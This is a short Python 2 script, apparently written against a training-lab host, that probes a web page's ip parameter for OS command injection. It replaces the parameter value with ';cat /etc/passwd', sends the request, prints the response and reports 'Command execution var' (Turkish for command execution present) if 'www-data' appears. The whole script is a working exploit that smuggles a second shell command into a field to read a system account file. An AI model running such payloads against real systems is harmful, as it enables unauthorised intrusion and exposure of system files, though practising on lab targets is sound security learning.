import requests
url="http://ptl-3e8302f0-4cb1c4e5.libcurl.so/?ip=127.0.0.1"
esittirKonum=str(url).find("=")
url=url[:esittirKonum+1]+";cat /etc/passwd"
sonuc=requests.get(url=url)
print sonuc.content
if "www-data" in sonuc.content:
    print "Command execution var"
